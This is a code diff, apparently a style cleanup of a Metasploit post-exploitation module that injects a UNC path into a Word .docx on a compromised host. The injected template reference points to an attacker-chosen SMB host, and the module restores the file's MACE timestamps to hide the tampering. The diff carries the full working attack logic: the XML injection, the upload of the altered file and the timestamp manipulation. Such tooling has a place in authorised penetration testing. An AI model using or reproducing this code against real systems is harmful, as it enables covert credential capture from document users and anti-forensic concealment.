@@ -65,8 +65,8 @@ class MetasploitModule < Msf::Post
   def get_mace
     begin
       mace = session.priv.fs.get_file_mace(datastore['FILE'])
-      vprint_status("Got file MACE attributes!")
-    rescue
+      vprint_status('Got file MACE attributes!')
+    rescue StandardError
       print_error("Error getting the original MACE values of #{datastore['FILE']}, not a fatal error but timestamps will be different!")
     end
     return mace
@@ -75,12 +75,12 @@ class MetasploitModule < Msf::Post
   # here we unzip into memory, inject our UNC path, store it in a temp file and
   # return the modified zipfile name for upload
   def manipulate_file(zipfile)
-    ref = "<w:attachedTemplate r:id=\"rId1\"/>"
+    ref = '<w:attachedTemplate r:id="rId1"/>'
 
-    rels_file_data = ""
-    rels_file_data << "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>"
-    rels_file_data << "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\">"
-    rels_file_data << "<Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/"
+    rels_file_data = ''
+    rels_file_data << '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
+    rels_file_data << '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
+    rels_file_data << '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/'
     rels_file_data << "attachedTemplate\" Target=\"file://\\\\#{datastore['SMBHOST']}\\normal.dot\" TargetMode=\"External\"/></Relationships>"
 
     zip_data = unzip_docx(zipfile)
@@ -89,42 +89,40 @@ class MetasploitModule < Msf::Post
     end
 
     # file to check for reference file we need
-    file_content = zip_data["word/settings.xml"]
+    file_content = zip_data['word/settings.xml']
     if file_content.nil?
-      print_error("Bad \"word/settings.xml\" file, check if it is a valid .docx.")
+      print_error('Bad "word/settings.xml" file, check if it is a valid .docx.')
       return nil
     end
 
     # if we can find the reference to our inject file, we don't need to add it and can just inject our unc path.
-    if not file_content.index("w:attachedTemplate r:id=\"rId1\"").nil?
-      vprint_status("Reference to rels file already exists in settings file, we dont need to add it :)")
-      zip_data["word/_rels/settings.xml.rels"] = rels_file_data
-      return zip_docx(zip_data)
+    if !file_content.index('w:attachedTemplate r:id="rId1"').nil?
+      vprint_status('Reference to rels file already exists in settings file, we dont need to add it :)')
     else
       # now insert the reference to the file that will enable our malicious entry
-      insert_one = file_content.index("<w:defaultTabStop")
+      insert_one = file_content.index('<w:defaultTabStop')
 
       if insert_one.nil?
-        insert_two = file_content.index("<w:hyphenationZone") # 2nd choice
-        if not insert_two.nil?
-          vprint_status("HypenationZone found, we use this for insertion.")
+        insert_two = file_content.index('<w:hyphenationZone') # 2nd choice
+        if !insert_two.nil?
+          vprint_status('HypenationZone found, we use this for insertion.')
           file_content.insert(insert_two, ref)
         end
       else
-        vprint_status("DefaultTabStop found, we use this for insertion.")
+        vprint_status('DefaultTabStop found, we use this for insertion.')
         file_content.insert(insert_one, ref)
       end
 
       if insert_one.nil? && insert_two.nil?
-        print_error("Cannot find insert point for reference into settings.xml")
+        print_error('Cannot find insert point for reference into settings.xml')
         return nil
       end
 
       # update the files that contain the injection and reference
-      zip_data["word/settings.xml"] = file_content
-      zip_data["word/_rels/settings.xml.rels"] = rels_file_data
-      return zip_docx(zip_data)
+      zip_data['word/settings.xml'] = file_content
     end
+    zip_data['word/_rels/settings.xml.rels'] = rels_file_data
+    return zip_docx(zip_data)
   end
 
   # RubyZip sometimes corrupts the document when manipulating inside a
@@ -156,11 +154,11 @@ class MetasploitModule < Msf::Post
 
   # We try put the mace values back to that of the original file
   def set_mace(mace)
-    if not mace.nil?
+    if !mace.nil?
       vprint_status("Setting MACE value of #{datastore['FILE']} set to that of the original file.")
       begin
-        session.priv.fs.set_file_mace(datastore['FILE'], mace["Modified"], mace["Accessed"], mace["Created"], mace["Entry Modified"])
-      rescue
+        session.priv.fs.set_file_mace(datastore['FILE'], mace['Modified'], mace['Accessed'], mace['Created'], mace['Entry Modified'])
+      rescue StandardError
         print_error("Error setting the original MACE values of #{datastore['FILE']}, not a fatal error but timestamps will be different!")
       end
     end
@@ -173,7 +171,7 @@ class MetasploitModule < Msf::Post
   def run
     # sadly OptPath does not work, so we check manually if it exists
     if !file_exist?(datastore['FILE'])
-      print_error("Remote file does not exist!")
+      print_error('Remote file does not exist!')
       return
     end
 
@@ -191,8 +189,8 @@ class MetasploitModule < Msf::Post
       # FileUtils.mkdir_p(logs_dir)
       # @org_file =  logs_dir + File::Separator + datastore['FILE'].split('\\').last
       @org_file = store_loot(
-        "host.word_unc_injector.changedfiles",
-        "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
+        'host.word_unc_injector.changedfiles',
+        'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
         rhost,
         org_file_data,
         datastore['FILE']
@@ -202,17 +200,17 @@ class MetasploitModule < Msf::Post
       note_string = "Remote file #{datastore['FILE']} contains UNC path to #{datastore['SMBHOST']}. "
       note_string += " Local backup of file at #{@org_file}."
       report_note(
-        :host => session.session_host,
-        :type => "host.word_unc_injector.changedfiles",
-        :data => {
-          :session_num => session.sid,
-          :stype => session.type,
-          :desc => session.info,
-          :platform => session.platform,
-          :via_payload => session.via_payload,
-          :via_exploit => session.via_exploit,
-          :created_at => Time.now.utc,
-          :files_changed => note_string
+        host: session.session_host,
+        type: 'host.word_unc_injector.changedfiles',
+        data: {
+          session_num: session.sid,
+          stype: session.type,
+          desc: session.info,
+          platform: session.platform,
+          via_payload: session.via_payload,
+          via_exploit: session.via_exploit,
+          created_at: Time.now.utc,
+          files_changed: note_string
         }
       )
     else
@@ -230,15 +228,19 @@ class MetasploitModule < Msf::Post
 
     # upload the injected file
     write_file(datastore['FILE'], injected_file)
-    print_status("Uploaded injected file.")
+    print_status('Uploaded injected file.')
 
     # set mace values back to that of original
     set_mace(file_mace)
 
     # remove tmpfile if no backup is desired
-    if not datastore['BACKUP']
+    if !datastore['BACKUP']
       @org_file.close
-      @org_file.unlink rescue nil # Windows often complains about unlinking tempfiles
+      begin
+        @org_file.unlink
+      rescue StandardError
+        nil
+      end
     end
 
     print_good("Done! Remote file #{datastore['FILE']} succesfully injected to point to #{datastore['SMBHOST']}")
